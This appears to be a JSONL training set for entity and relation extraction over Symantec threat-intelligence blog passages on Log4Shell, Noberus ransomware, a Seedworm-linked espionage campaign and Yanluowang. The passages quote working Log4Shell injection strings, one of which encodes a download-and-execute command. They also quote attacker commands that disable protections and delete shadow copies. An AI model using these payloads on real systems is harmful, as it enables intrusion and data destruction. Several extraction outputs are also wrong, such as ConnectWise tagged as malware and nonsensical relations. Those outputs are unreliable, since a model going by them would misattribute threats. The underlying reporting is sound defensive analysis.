{"instruction": "The Threat Landscape in 2021 Download the Whitepaper Now \nDownload the Whitepaper Now \nSymantec Enterprise Blogs You might also enjoy \n4 Min Read", "input": null, "output": "No related entities and relations."}
{"instruction": "Log4j Vulnerabilities: Attack Insights Symantec data shows variation and scope of attacks. \nSymantec Enterprise Blogs You might also enjoy \n3 Min Read", "input": null, "output": "No related entities and relations."}
{"instruction": "Apache Log4j Zero-Day Being Exploited in the Wild Symantec products will protect against attempted exploits of critical CVE-2021-44228 vulnerability", "input": null, "output": "Named Entities: (CVE-2021-44228, vulnerability)\nRelationships: No related relations."}
{"instruction": "Log4j Vulnerabilities: Attack Insights", "input": null, "output": "No related entities and relations."}
{"instruction": "Symantec data shows variation and scope of attacks. \nApache Log4j is a Java-based logging utility. The library\u2019s main role is to log information related to security and performance to make error debugging easier and to enable applications to run smoothly. The library is part of the Apache Logging Services, a project of the Apache Software Foundation. \nLog4j has been making headlines recently after the public disclosure of three critical vulnerabilities in the utility which can lead to remote code execution (CVE-2021-44228 and CVE-2021-45046) and denial of service (CVE-2021-45105). The initial remote code execution vulnerability (CVE-2021-44228) has been dubbed Log4Shell and has dominated cyber-security news ever since it was publicly disclosed on December 9. The vulnerability has been exploited to deploy a plethora of payloads like coin miners, Dridex malware, and even ransomware such as Conti.", "input": null, "output": "Named Entities: (CVE-2021-44228, vulnerability), (CVE-2021-45046, vulnerability), (CVE-2021-45105, vulnerability), (coin miners, malware), (Dridex, malware), (Conti, malware)\nRelationships: (CVE-2021-44228, been exploited to, coin miners), (CVE-2021-44228, been exploited to, Dridex, malware), (CVE-2021-44228, been exploited to, Conti)"}
{"instruction": "Variations in attacks \nSymantec, a division of Broadcom Software , has observed numerous variations in attack requests primarily aimed at evading detection. Some sample attack requests can be seen in Table 1. \nTable 1. Sample of Log4j vulnerability attack requests seen by Symantec \nAttack requests \n${jndi:ldap://:1389/Exploit} \n${jndi:dns://MASKED_IP.1/securityscan-http8085} \n${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//MASKED_IP:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}') \n${${lower:${lower:jndi}}:${lower:rmi}://MASKED_IP:1389/Binary} \n${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://MASKED_IP:1389/Binary} \n${${::-j}${::-n}d${::-i}:${::-l}${::-d}${::-a}${::-p}://${::-1}${::-5}${::-9}.${::-2}${::-2}MASKED_IP:44${::-3}/${::-o}=${::-t}omca${::-t}} \nAttackers are predominantly using the LDAP and RMI protocols to download malicious payloads. We have also recorded vulnerability scans using protocols such as IIOP, DNS, HTTP, NIS etc.", "input": null, "output": "No related entities and relations."}
{"instruction": "Payloads Muhstik Botnet - We have observed attackers downloading malicious Java class files as a part of Log4shell exploitation. The malicious class file downloads a shell file with the content shown in Figure 1. Figure 1. Content of shell file downloaded by malicious class file The shell script attempts to download Executable and Linkable Format (ELF) files and execute them, which leads to the installation of the Muhstik botnet. XMRig miner - We have also observed attackers installing the XMRig cryptocurrency miner as a part of post-exploitation activity related to Log4shell exploitation. The miner is downloaded via a simple PowerShell command (Figure 2). Figure 2. PowerShell command used to download XMRig miner The miner is executed with the command shown in Figure 3. Figure 3. Command used to execute XMRig miner", "input": null, "output": "Named Entities: (Muhstik Botnet, malware), (Muhstik botnet, malware), (XMRig miner, malware), (PowerShell command, tool)\nRelationships: (XMRig miner, download, PowerShell command), (PowerShell command, execute, XMRig miner), (XMRig miner, post-exploitation activity, Log4shell exploitation)"}
{"instruction": "Malicious class file backdoor - We have also seen attacks attempt to download a malicious Java class file that acts as a backdoor. The class file has code to listen for and execute commands from the attacker (Figure 4). Figure 4. Code used to listen for and execute commands from attacker Reverse Bash shell \u2013 Attackers were also observed deploying reverse shells on vulnerable machines (Figure 5). Figure 5. Code used to deploy reverse shell on vulnerable machines Other publicly reported payloads include the Khonsari and Conti ransomware threats, the Orcus remote access Trojan (RAT), and the Dridex malware, among others.", "input": null, "output": "Named Entities: (malicious Java class file, malware), (backdoor, threat type), (Dridex, malware)\nRelationships: (malicious Java class file, act as, backdoor)"}
{"instruction": "Symantec IPS data For the period between December 9 (when the first Log4j vulnerability was disclosed) and December 21, Symantec\u2019s Intrusion Prevention System (IPS) blocked more than 93 million Log4Shell related exploitation attempts on more than 270,000 unique machines. Figure 6. Blocked Log4Shell related exploitation attempts against unique machines During the same time frame, IPS blocked more than 18 million Log4Shell related exploitation attempts on more than 60,000 unique server machines. Figure 7. Blocked Log4Shell related exploitation attempts against servers The majority of Log4Shell attacks blocked by Symantec were against machines located in the U.S. and the United Kingdom, followed by Singapore, India, and Australia. Figure 8. The majority of Log4Shell attacks blocked by Symantec were against machines located in the U.S. and United Kingdom", "input": null, "output": "Named Entities: (Symantec IPS, tool)\nRelationships: No related relations."}
{"instruction": "Meanwhile, the majority of attacks exploiting the Log4j vulnerabilities seem to originate from devices located in the U.S. and Germany, followed by Russia, the United Kingdom, and China. Figure 9. The majority of attackers exploiting the Log4j vulnerabilities are located in the U.S. and Germany", "input": null, "output": "No related entities and relations."}
{"instruction": "Review the Linux proxy execution list for your Log4j-based application sandbox to include additional tools such as */curl, */wget. These tools are used by attackers to connect from the victim Log4j application to external command-and-control servers for downloading additional payloads. DCS sandboxing of Windows and Linux applications prevent suspicious program execution using living-off-the-land tools and tampering of critical system services and resources. Network Control: Ability to block outgoing connections to public internet and limit required LDAP, HTTP, and other traffic from server workloads and containerized applications using Log4j2 to internal trusted systems.", "input": null, "output": "Named Entities: (Log4j-based application sandbox, tool), (*/curl, tool), (*/wget, tool), (Log4j application, tool), (external command-and-control servers, tool), (Log4j2, tool)\nRelationships: (Log4j-based application sandbox, include, */curl), (Log4j-based application sandbox, include, */wget), (Log4j application, connect to, external command-and-control servers)"}
{"instruction": "Detection Policies: System Attack detection: Baseline_WebAttackDetection_Generic_MaliciousUserAgent rule should be updated to include *jndi:* select string to alert on malicious server requests using the suspicious jndi lookup attempts via jndi:ldap, jndi:rmi, jndi:dns etc. Make sure to set the path to your web server access log file in the IDS Web Attack Detection option. Similar custom text log rules should be added for each of your Log4j application log files.", "input": null, "output": "Named Entities: (IDS Web Attack Detection, tool)\nRelationships: No related relations."}
{"instruction": "Noberus: Technical Analysis Shows Sophistication of New Rust-based Ransomware", "input": null, "output": "Named Entities: (Noberus, malware), (Ransomware, threat type)\nRelationships: (Noberus, belong to, Ransomware)"}
{"instruction": "New ransomware used in mid-November attack, ConnectWise was likely infection vector. Symantec\u2019s Threat Hunter Team has additional technical information to share on the new ALPHV/BlackCat ransomware that was first published about last week, and which we have been tracking for several weeks. Symantec, a division of Broadcom Software , tracks this ransomware as Ransom.Noberus and our researchers first spotted it on a victim organization on November 18, 2021, with three variants of Noberus deployed by the attackers over the course of that attack. This would appear to show that this ransomware was active earlier than was previously reported, with MalwareHunterTeam having told BleepingComputer they first saw this ransomware on November 21 .", "input": null, "output": "Named Entities: (ConnectWise, malware), (ALPHV/BlackCat ransomware, malware), (Ransom.Noberus, malware)\nRelationships: (ConnectWise, infection vector, ALPHV/BlackCat ransomware)"}
{"instruction": "Noberus is an interesting ransomware because it is coded in Rust, and this is the first time we have seen a professional ransomware strain that has been used in real-world attacks coded in this programming language. Noberus appears to carry out the now-typical double extortion ransomware attacks where they first steal information from victim networks before encrypting files. Noberus adds the .sykffle extension to encrypted files. This blog contains information about the attack chain we observed in one victim organization, as well as technical details about the operation of this ransomware.", "input": null, "output": "Named Entities: (Noberus, malware), (double extortion, threat type)\nRelationships: (Noberus, carry out, double extortion)"}
{"instruction": "The first suspicious activity observed by Symantec occurred on a victim\u2019s network on November 3, approximately two weeks before Noberus was deployed. During this time, suspicious network activity was observed. Later on November 18, shortly before Noberus was deployed, ConnectWise was also executed. A few hours later, Noberus was deployed, indicating that the attackers may have leveraged access to ConnectWise to deploy their payload. While it is a legitimate tool, ConnectWise has frequently been exploited by ransomware attackers in recent times to gain access to victim networks.", "input": null, "output": "Named Entities: (Noberus, malware), (ConnectWise, tool), (ransomware attackers, attacker)\nRelationships: (Noberus, deploy, ConnectWise), (ConnectWise, exploit, ransomware attackers)"}
{"instruction": "Anatomy of an attack On November 3, suspicious Server Message Block (SMB) requests occurred on the earliest machine to get infected on the victim network. This was followed by remote Local Security Authority (LSA) registry dump attempts from a remote machine on the network. This suggests the attackers may have compromised another machine on the network where we didn't have visibility, or they could also have added a new machine to the domain from which they were launching attacks to dump credentials. On the same day, PsExec was also executed from a remote machine to launch a command prompt. The attackers used this to disable a restricted remote administration feature known as \u2018RestrictedAdmin mode\u2019 via the Windows registry. This effectively disables safeguards guarding against 'pass the hash' attacks targeting Remote Desktop Protocol (RDP), allowing the attackers to attempt to gain higher administrative privileges.", "input": null, "output": "Named Entities: (PsExec, tool)\nRelationships: No related relations."}
{"instruction": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 The next activity occurred on November 18 when PsExec was used to run multiple PowerShell commands to effectively disable Windows Defender. Specifically, the PowerShell command used added *.exe to an exclusion list for AV scanning, and this command was executed across the entire organization. Later on November 18, the first instance of Noberus ransomware was deployed via PsExec. In order for Noberus to execute properly, it requires a specific \u2018access-token\u2019. This acts as a unique key, which is used to distinguish the victim when visiting the Noberus operators\u2019 Tor site. The following similar commands were observed being executed: CSIDL_WINDOWS\\temp\\psexec.exe -accepteula \\\\[REDACTED] -u [REDACTED] -p [REDACTED] -s -d -f -c [REDACTED].exe --access-token [REDACTED] --no-prop-servers \\\\[REDACTED] --propagated [REDACTED].exe --access-token [REDACTED] --no-net In the above, PsExec is launched with the following specific command line arguments: s \u2013 Run under the System account", "input": null, "output": "Named Entities: (PsExec, tool), (Noberus ransomware, malware), (Tor site, tool)\nRelationships: (PsExec, deploy, Noberus ransomware)"}
{"instruction": "d \u2013 Run as a non-interactive process (don\u2019t wait for the process to terminate) f, c \u2013 Copy Noberus file to the remote machine For the second command above, the \u2018no-net\u2019 command line argument instructs Noberus not to process network shares during propagation. See the Technical Details below for a full list of support command line arguments and their description. In all the samples of Noberus that we have access to, the victim\u2019s administrative credentials are embedded as part of the configuration block, showing that this attack was specifically targeted at this victim. Once Noberus is executed, the ransomware first deletes any available shadow copies, which is typical in ransomware attacks, in order to stop the organization from restoring encrypted files. cmd /c vssadmin.exe delete shadows /all /quiet", "input": null, "output": "Named Entities: (Noberus, malware), (cmd.exe, file), (vssadmin.exe, file)\nRelationships: (Noberus, execute, cmd.exe), (cmd.exe, delete, vssadmin.exe)"}
{"instruction": "This is used to follow various types of shortcuts (local and remote), likely to ensure Noberus can follow these shortcuts and perform encryption. As part of the propagation mechanism, Noberus attempts to mount hidden partitions. It then attempts to spread via the \u2018net use\u2019 command. The embedded administrative credentials are used as part of this mechanism along with PsExec, which is embedded in a compressed form within Noberus. During the attack, the attackers were also seen modifying the maximum limit of concurrent requests machines could make via PsExec. cmd /c reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f This was likely to aid in the propagation of Noberus across the network. At this stage, Noberus proceeds to terminate a set of pre-defined processes and begin the encryption process.", "input": null, "output": "Named Entities: (Noberus, malware), (PsExec, tool), (cmd.exe, file)\nRelationships: (Noberus, use, PsExec)"}
{"instruction": "At some point during the attack the organization became aware of the infection and deployed remediation software. However, despite this, it appears the attackers were able to return and deploy another variant of their ransomware to other systems on the network. In total, three variants of this ransomware were identified during this intrusion, leading to at least 261 machines on the network becoming infected with Noberus.", "input": null, "output": "Named Entities: (ransomware, threat type), (Noberus, malware)\nRelationships: No related relations."}
{"instruction": "Ransom.Noberus: Technical Details A technical analysis of Noberus itself found that a lot of its behavior is consistent with the activity we saw on the victim network. The first step it takes after being deployed on victim networks is to remove shadow copies: cmd /c vssadmin.exe delete shadows /all /quiet It then issues a command to collect Universally Unique Identifiers (UUIDs) from infected machines. cmd /c wmic csproduct get UUID The UUID and parameter \u2018access token\u2019 are then used to generate \"ACCESS_KEY\". Navigate to: http://mu75ltv3lxd24dbyu6gtvmnwybecigs5auki7fces437xvvflzva2nqd.onion/?access-key=${ACCESS_KEY} \" Noberus then enables the remote-to-local and remote-to-remote symbolic link evaluations. cmd /c fsutil behavior set SymlinkEvaluation R2L:1 cmd /c fsutil behavior set SymlinkEvaluation R2R:1 It then attempts to mount a hidden partition, by issuing the following commands: Enumerates volumes by FindFirstVolume FindNextVolume FindVolumeClose Then gets the pathname by: GetVolumePathNamesForVolumeName If the volume does not have a pathname, Noberus mounts it with: SetVolumeMountPoint.", "input": null, "output": "Named Entities: (Ransom.Noberus, malware), (http://mu75ltv3lxd24dbyu6gtvmnwybecigs5auki7fces437xvvflzva2nqd.onion/?access-key=${ACCESS_KEY}, URL)\nRelationships: (Ransom.Noberus, Navigate to, (http://mu75ltv3lxd24dbyu6gtvmnwybecigs5auki7fces437xvvflzva2nqd.onion/?access-key=${ACCESS_KEY})"}
{"instruction": "Noberus then cleans up the Recycle Bin and attempts to propagate via network share. It looks for available shares by using the \u2018net use\u2019 command or NetShareEnum function. Embedded administrative credentials may then be used for propagation via network share. Noberus also attempts to propagate via PsExec. locker::core::windows::psexec The PsExec module is embedded in the Noberus code ( see Figure 1 ). It is compressed with zlib ( Figure 2 ). Figure 1. PsExec embedded in ransomware code Figure 2. PsExec compressed by zlib in ransomware code The decompressed PsExec file is a legitimate Microsoft-signed clean file ( Figure 3 ). Figure 3. Decompressed PsExec file Once it has gained access to a machine, Noberus then proceeds to kill the following processes and services: \"encsvc\",\"thebat\",\"mydesktopqos\",\"xfssvccon\",\"firefox\",\"infopath\",\"winword\",\"steam\",\"synctime\", \"notepad\",\"ocomm\",\"onenote\",\"mspub\",\"thunderbird\",\"agntsvc\",\"sql\",\"excel\",\"powerpnt\", \"outlook\",\"wordpad\",\"dbeng50\",\"isqlplussvc\",\"sqbcoreservice\",\"oracle\",\"ocautoupds\", \"dbsnmp\",\"msaccess\",\"tbirdconfig\",\"ocssd\",\"mydesktopservice\",\"visio\", \"sql*\", \"mepocs\",\"memtas\",\"veeam\",\"svc$\",\"backup\",\"sql\",\"vss\",\"msexchange\" It also excludes certain directories, filenames, and file extensions from the encryption process, such as:", "input": null, "output": "Named Entities: (Noberus, malware)\nRelationships: No related relations."}
{"instruction": "\"system volume information\",\"intel\",\"$windows.~ws\",\"application data\",\"$recycle.bin\", \"mozilla\",\"program files (x86)\",\"program files\",\"$windows.~bt\",\"public\",\"msocache\",\"windows\",\"default\",\"all users\", \"tor browser\", \"programdata\",\"boot\",\"config.msi\",\"google\",\"perflogs\",\"appdata\", \"windows.old\", \"desktop.ini\",\"autorun.inf\",\"ntldr\",\"bootsect.bak\",\"thumbs.db\",\"boot.ini\",\"ntuser.dat\", \"iconcache.db\",\"bootfont.bin\",\"ntuser.ini\",\"ntuser.dat.log\",\"themepack\",\"nls\",\"diagpkg\", \"msi\",\"lnk\",\"exe\",\"cab\",\"scr\",\"bat\",\"drv\",\"rtp\",\"msp\",\"prf\",\"msc\", \"ico\", \"key\",\"ocx\",\"diagcab\",\"diagcfg\", \"pdb\",\"wpx\",\"hlp\",\"icns\",\"rom\",\"dll\",\"msstyles\",\"mod\",\"ps1\",\"ics\",\"hta\",\"bin\",\"cmd\",\"ani\", \"386\",\"lock\",\"cur\",\"idx\",\"sys\",\"com\",\"deskthemepack\",\"shs\",\"ldf\",\"theme\",\"mpa\",\"nomedia\", \"spl\",\"cpl\",\"adv\",\"icl\",\"msu\" Noberus then proceeds to encrypt files using either AES or ChaCha20 encryption. The private key for encrypted machines appears to be generated randomly. It appears that Noberus generates a random number using BCryptGenRandom and calculates each byte with the string shown in Figure 4 . Figure 4. String used to calculate the private key Files that have been encrypted have .sykffle appended to the end of their filename, in the following format: [original filename].[extension].sykffle Noberus then creates a ransomware note, creating a .txt and a .png file that are displayed to victims, with the following filenames: RECOVER-sykffle-FILES.txt RECOVER-sykffle-FILES.txt.png The text file tells victims the following: > Introduction Important files on your system was ENCRYPTED and now they have \"sykffle\" extension.", "input": null, "output": "Named Entities: (Noberus, malware), (RECOVER-sykffle-FILES.txt, file), (RECOVER-sykffle-FILES.txt.png, file)\nRelationships: (Noberus, create ransomware note, RECOVER-sykffle-FILES.txt), (Noberus, create ransomware note, RECOVER-sykffle-FILES.txt.png)"}
{"instruction": "Figure 5. Noberus ransom note", "input": null, "output": "No related entities and relations."}
{"instruction": "Significance of this new ransomware This is a sophisticated new ransomware with no apparent weaknesses in its encryption process, meaning unless victims have comprehensive backups they will be obliged to pay the ransom to recover their files. The fact it is written in Rust is interesting, as while Rust is not typically seen being used by malware developers, it is growing in popularity and it shows that ransomware developers too are not afraid to innovate in this area.", "input": null, "output": "Named Entities: (ransomware, threat type)\nRelationships: No related relations."}
{"instruction": "While the reported number of victims of this ransomware so far appears to be small, the sophistication of Noberus itself and the level of determination shown by the attackers in the attack we did observe indicates it is likely we will see more of this ransomware in the future. It is also reported that the developers behind this ransomware are actively seeking affiliates on Russian-speaking hacking forums, meaning the number of malicious actors deploying this ransomware is likely to grow.", "input": null, "output": "Named Entities: (Noberus, malware), (ransomware, threat type), (attackers, attacker)\nRelationships: (Noberus, type, ransomware)"}
{"instruction": "Yanluowang: Further Insights on New Ransomware Threat At least one attacker now using Yanluowang may have previously been linked to Thieflock ransomware operation.", "input": null, "output": "Named Entities: (Yanluowang, malware)\nRelationships: No related relations."}
{"instruction": "Espionage Campaign Targets Telecoms Organizations across Middle East and Asia", "input": null, "output": "No related entities and relations."}
{"instruction": "Tentative link to Iran-backed Seedworm group. \nAttackers most likely linked to Iran have attacked a string of telecoms operators in the Middle East and Asia over the past six months, in addition to a number of IT services organizations and a utility company. \nOrganizations in Israel, Jordan, Kuwait, Saudi Arabia, the United Arab Emirates, Pakistan, Thailand, and Laos were targeted in the campaign, which appears to have made no use of custom malware and instead relied on a mixture of legitimate tools, publicly available malware, and living-off-the-land tactics. While the identity of the attackers remains unconfirmed, there is some evidence to suggest a link to the Iranian Seedworm (aka MuddyWater) group.\u00a0 The targeting and tactics are consistent with Iranian-sponsored actors.", "input": null, "output": "Named Entities: (Seedworm, attacker), (MuddyWater, attacker)\nRelationships: (Seedworm, aka, MuddyWater)"}
{"instruction": "Attack outline \nAfter breaching a targeted network, the attackers typically attempt to steal credentials and move laterally across the network. They appear to be particularly interested in Exchange Servers, deploying web shells onto them. In some cases, the attackers may be using compromised organizations as stepping stones to additional victims. Furthermore, some targets may have been compromised solely to perform supply-chain-type attacks on other organizations. \nIn most attacks, the infection vector is unknown. Evidence of a possible vector was found at only one target. A suspected ScreenConnect setup MSI appeared to have been delivered in a zipped file named \u201cSpecial discount program.zip\u201d, suggesting that it arrived in a spear-phishing email.", "input": null, "output": "Named Entities: (web shells, tool), (ScreenConnect setup MSI, tool), (Special discount program.zip, file), (spear-phishing email, tool)\nRelationships: (ScreenConnect setup MSI, delivered in, Special discount program.zip), (Special discount program.zip, arrived in, spear-phishing email)"}
{"instruction": "Telecoms attack In one attack against a telecoms firm in the Middle East, which began in August 2021, the first evidence of compromise was the creation of a service to launch an unknown Windows Script File (WSF). Scripts were then used to issue various domain, user discovery, and remote service discovery commands. The attackers used PowerShell to download another WSF and run it. Net group was used to query for the \u201cexchange trusted subsystem\u201d domain group. The attackers used Certutil to download a suspected Ligolo tunneling tool and launch WMI, which was used to get remote machines to carry out the following tasks: Execute Certutil to download an unknown file Execute Certutil to download an unknown WSF file and execute Wscript to launch this script Execute PowerShell to download and execute content Execute PowerShell to download a suspected web shell to an Exchange Server", "input": null, "output": "Named Entities: (Telecoms attack, attack), (PowerShell, tool), (Net group, tool), (Certutil, tool), (Ligolo tunneling tool, tool), (WMI, tool)\nRelationships: (Telecoms attack, use, PowerShell), (Telecoms attack, use, Net group), (Telecoms attack, use, Certutil), (Telecoms attack, use, Ligolo tunneling tool), (Telecoms attack, use, WMI), (\"exchange trusted subsystem\" domain group, queried by, Net group)"}
{"instruction": "Based on process lineage data, attackers seemed to use scripts extensively. These may be automated scripts used for collecting information and downloading additional tools. However, in one instance, a command asks cURL for help, suggesting that there may have been at least some hands-on-keyboard activity on the part of the attackers. The attackers then used a remote access tool, believed to be eHorus, to perform the following tasks: Deliver and run a suspected Local Security Authority Subsystem Service (LSASS) dumping tool Deliver what are believed to be Ligolo tunneling tools Execute Certutil to request a URL from Exchange Web Services (EWS) of what appears to be other targeted organizations", "input": null, "output": "Named Entities: (cURL, tool), (eHorus, tool), (LSASS dumping tool, tool), (Ligolo tunneling tools, tool), (Certutil, tool), (Exchange Web Services, tool)\nRelationships: (scripts, use, cURL), (scripts, use, eHorus), (eHorus, deliver and run, LSASS dumping tool), (eHorus, deliver, Ligolo tunneling tools), (eHorus, execute, Certutil), (Certutil, request, Exchange Web Services)"}
{"instruction": "One feature of this attack against a telecoms organization is that the attackers may have attempted to pivot to other targets by connecting to the Exchange Web Services (EWS) of other organizations, another telecoms operator, and an electronic equipment company in the same region. The following commands were used: certutil.exe -urlcache \u2013split [DASH]f hxxps://[REDACTED]/ews/exchange[.]asmx certutil.exe -urlcache -split [DASH]f hxxps://webmail.[REDACTED][.]com/ews It is unclear what the intent of these requests is. It is possible the attackers were attempting to check connectivity to these organizations.", "input": null, "output": "Named Entities: (certutil.exe, file), (hxxps://[REDACTED]/ews/exchange[.]asmx, URL), (hxxps://webmail.[REDACTED][.]com/ews, URL)\nRelationships: No related relations."}
{"instruction": "Possible supply chain attack \nOne target that appeared to be an outlier was a utility company in Laos. The infection vector may have been the exploit of a public-facing service since the first machine that appeared to be compromised was an IIS web server. Suspicious activity also had w3wp.exe in the process lineage. \nThe attackers then used PowerShell to: \nDownload a suspected Ligolo tunneling tool \nDownload an unknown PowerShell script \nDownload an unknown XLS file \nThe attackers then used PowerShell to connect to a webmail server of an organization in Thailand. They also attempted to connect to IT-related servers belonging to another company in Thailand. \nTo facilitate credential theft, WMI was used to execute PowerShell to modify the registry to store passwords in plaintext in memory. In addition to this, an obfuscated version of the publicly available CrackMapExec tool appeared to be deployed.", "input": null, "output": "Named Entities: (supply chain attack, threat type), (w3wp.exe, file), (PowerShell, tool), (Ligolo tunneling tool, tool), (CrackMapExec tool, tool)\nRelationships: (PowerShell, download, Ligolo tunneling tool)"}
{"instruction": "Toolset \nThe attackers made heavy use of legitimate tools and publicly available hacking tools. These include: \nScreenConnect: Legitimate remote administration tool \nRemoteUtilities: Legitimate remote administration tool \neHorus: Legitimate remote administration tool \nLigolo: Reverse tunneling tool \nHidec: Command line tool for running a hidden window \nNping: Packet generation tool \nLSASS Dumper: Tool that dumps credentials from Local Security Authority Subsystem Service (LSASS) process \nSharpChisel: Tunneling tool \nPassword Dumper \nCrackMapExec: Publicly available tool that is used to automate security assessment of an Active Directory environment \nProcDump: Microsoft Sysinternals tool for monitoring an application for CPU spikes and generating crash dumps, but which can also be used as a general process dump utility \nSOCKS5 proxy server: Tunneling tool \nKeylogger: Retrieves browser credentials \nMimikatz: Publicly available credential dumping tool", "input": null, "output": "Named Entities: (ScreenConnect, tool), (RemoteUtilities, tool), (eHorus, tool), (Ligolo, tool), (Hidec, tool), (Nping, tool), (LSASS Dumper, tool), (SharpChisel, tool), (Password Dumper, tool), (CrackMapExec, tool), (ProcDump, tool), (SOCKS5 proxy server, tool), (Keylogger, tool), (Mimikatz, tool)\nRelationships: No related relations."}
{"instruction": "Seedworm link? \nThere is some evidence to suggest that the Iranian Seedworm group was responsible for these attacks. Two IP addresses used in this campaign have been previously linked to Seedworm activity. However, Seedworm is known to regularly switch its infrastructure, meaning conclusive attribution cannot be made. \nThere is also some overlap in tools between this campaign and earlier Seedworm campaigns. ScreenConnect, RemoteUtilities, SharpChisel, Ligolo, ProcDump, and Password Dumper were all referenced by Trend Micro in a March 2021 blog on Seedworm activity . \nIn the case of two tools \u2013 SharpChisel and Password Dumper \u2013 identical versions were used in this campaign to those that were documented by Trend.", "input": null, "output": "Named Entities: (Seedworm, attacker), (ScreenConnect, tool), (RemoteUtilities, tool), (SharpChisel, tool), (Ligolo, tool), (ProcDump, tool), (Password Dumper, tool), (Trend Micro, tool), (March 2021 blog, tool)\nRelationships: (Seedworm, responsible for, attacks), (campaign, overlap in, tools), (SharpChisel, used in, campaign), (Password Dumper, used in, campaign), (SharpChisel, documented by, Trend Micro), (Password Dumper, documented by, Trend Micro)"}
{"instruction": "Focused campaign \nIf these attacks are linked to Iran, it will not be the first time an Iranian threat actor has targeted the telecoms sector. In 2018, Symantec revealed that the Chafer group had compromised of a major telecoms services provider in the Middle East. \nWhile the ultimate end goal of the campaign remains unknown, the focus on telecoms operators suggests that the attackers are gathering intelligence on the sector and possibly attempting to pivot into spying on communications.", "input": null, "output": "Named Entities: (Iran, attacker), (Chafer group, attacker)\nRelationships: (Iran, linked to, attacks)"}
{"instruction": "Apache Log4j Zero-Day Being Exploited in the Wild", "input": null, "output": "No related entities and relations."}
{"instruction": "Symantec products will protect against attempted exploits of critical CVE-2021-44228 vulnerability UPDATE December 20, 2021: The Apache Software Foundation has released a patch for a third vulnerability in Log4j. Version 2.17.0 of the software was released on December 17 after issues were discovered with the previous release (2.16). Apache said that 2.16 does not always protect from infinite recursion in lookup evaluation and is vulnerable to CVE-2021-45105, a denial of service vulnerability. UPDATE December 15, 2021 : Apache has patched a second vulnerability in Log4j. The vulnerability ( CVE-2021-45046 ) arises from the fact that the fix for the previous vulnerability (CVE-2021-44228) did not completely prevent exploits in all circumstances. According to Apache, the vulnerability occurs in certain non-default configurations. It could permit attackers to \u201ccraft malicious input data using a JNDI Lookup pattern resulting in a denial of service (DOS) attack\u201d.", "input": null, "output": "Named Entities: (CVE-2021-44228, vulnerability), (Apache Software Foundation, tool), (Log4j, tool), (CVE-2021-45105, vulnerability), (CVE-2021-45046, vulnerability), (DOS attack, threat type)\nRelationships: (CVE-2021-45046, used for, DOS attack)"}
{"instruction": "A zero-day vulnerability (CVE-2021-44228) has been discovered in Apache Log4j which, if exploited, could permit a remote attacker to execute arbitrary code on vulnerable systems. Exploit code for this vulnerability, dubbed Log4Shell, has been shared publicly and multiple attackers are already attempting to exploit it. Q: Will Symantec protect against exploit attempts? A: Yes, Symantec products will guard against exploit attempts and payloads with the following detections: File-based Trojan.Maljava CL.Suspexec!gen106 CL.Suspexec!gen107 CL.Suspexec!gen108 Miner.XMRig!gen2 Ransom.Khonsari Ransom.Tellyouthepass Ransom.Tellyouthepa!g1 Ransom.Tellyouthepa!g2 Linux.Kaiten Trojan Horse Machine learning-based Heur.AdvML.C Network-based Attack: Log4j2 RCE CVE-2021-44228 Attack: Log4j2 RCE CVE-2021-44228 2 Attack: Log4j CVE-2021-45046 Attack: Malicious LDAP Response Audit: Log4j2 RCE CVE-2021-44228 Audit: Malicious LDAP Response Audit: Suspicious Java Class File Executing Arbitrary Commands Email-based Coverage is in place for Symantec's email security products Symantec Data Center Security provides a range of protection for server workloads against this vulnerability:", "input": null, "output": "Named Entities: (CVE-2021-44228, vulnerability), (Apache Log4j, tool), (Trojan.Maljava, malware), (Ransom.Khonsari, malware), (Ransom.Tellyouthepass, malware), (Ransom.Tellyouthepa!g1, malware), (Ransom.Tellyouthepa!g2, malware), (CVE-2021-44228, vulnerability), (CVE-2021-45046, vulnerability), (Malicious LDAP Response, attack), (Suspicious Java Class File Executing Arbitrary Commands, attack)\nRelationships: No related relations."}
{"instruction": "Q: Is this vulnerability being exploited in the wild? A: Yes. Exploit code is publicly available and there are multiple reports of exploit attempts. To date, activity appears to be mainly centered on coin mining botnets but it is only a matter of time before attackers of all types attempt to leverage this exploit.", "input": null, "output": "No related entities and relations."}
{"instruction": "Learn More Now \n1. Broadcom Response to Log4j Vulnerability \n2. Symantec Security Advisory", "input": null, "output": "No related entities and relations."}
{"instruction": "Yanluowang: Further Insights on New Ransomware Threat", "input": null, "output": "No related entities and relations."}
{"instruction": "At least one attacker now using Yanluowang may have previously been linked to Thieflock ransomware operation. \nYanluowang, the ransomware recently discovered by Symantec , a division of Broadcom Software , is now being used by a threat actor that has been mounting targeted attacks against U.S. corporations since at least August 2021. The attacker uses a number of tools, tactics, and procedures (TTPs) that were previously linked to Thieflock ransomware attacks, suggesting that they may have been a Thieflock affiliate who shifted allegiances to the new Yanluowang ransomware family. \nThe attackers have been heavily focused on organizations in the financial sector but have also targeted companies in the manufacturing, IT services, consultancy, and engineering sectors.", "input": null, "output": "Named Entities: (Yanluowang, malware)\nRelationships: No related relations."}
{"instruction": "Lateral movement In most cases, PowerShell is used to download tools to compromised systems including BazarLoader to assist in reconnaissance. The attackers then enable RDP via registry to enable remote access. After gaining initial access, the attackers usually deploy ConnectWise (formerly known as ScreenConnect), a legitimate remote access tool. In order to perform lateral movement and identify systems of interest, such as the victim\u2019s Active Directory server, the attackers deploy Adfind, a free tool that can be used to query Active Directory, and SoftPerfect Network Scanner (netscan.exe), a publicly available tool used for discovery of hostnames and network services. The next phase of the attack is credential theft and the attackers use a wide range of credential-stealing tools, including: GrabFF: A tool that can dump passwords from Firefox GrabChrome: A tool that can dump passwords from Chrome", "input": null, "output": "Named Entities: (BazarLoader, tool), (ConnectWise, tool), (ScreenConnect, tool), (Adfind, tool), (SoftPerfect Network Scanner, tool), (GrabFF, tool), (GrabChrome, tool)\nRelationships: (attackers, deploy, ConnectWise), (attackers, deploy, Adfind), (attackers, deploy, SoftPerfect Network Scanner), (attackers, use, GrabFF), (attackers, use, GrabChrome)"}
